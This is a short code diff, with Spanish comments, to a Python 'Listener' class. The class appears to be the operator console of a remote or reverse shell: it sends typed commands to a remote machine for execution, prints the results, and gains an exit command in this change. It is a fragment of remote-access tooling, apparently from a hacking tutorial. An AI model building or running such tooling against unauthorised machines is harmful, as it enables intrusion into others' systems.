@@ -26,7 +26,13 @@ class Listener:
     
     def run(self):
         while True:
-            command = input("shell »» ")
+            command = input("shell »» ")  # ← Sin \n
+            
+            # ← ✅ CHECK PRIMERO
+            if command == "salir":
+                self.connection.close()
+                exit()
+            
             result = self.ejecutarRemoto(command)
             print(result.decode('utf-8', errors='ignore'))
 
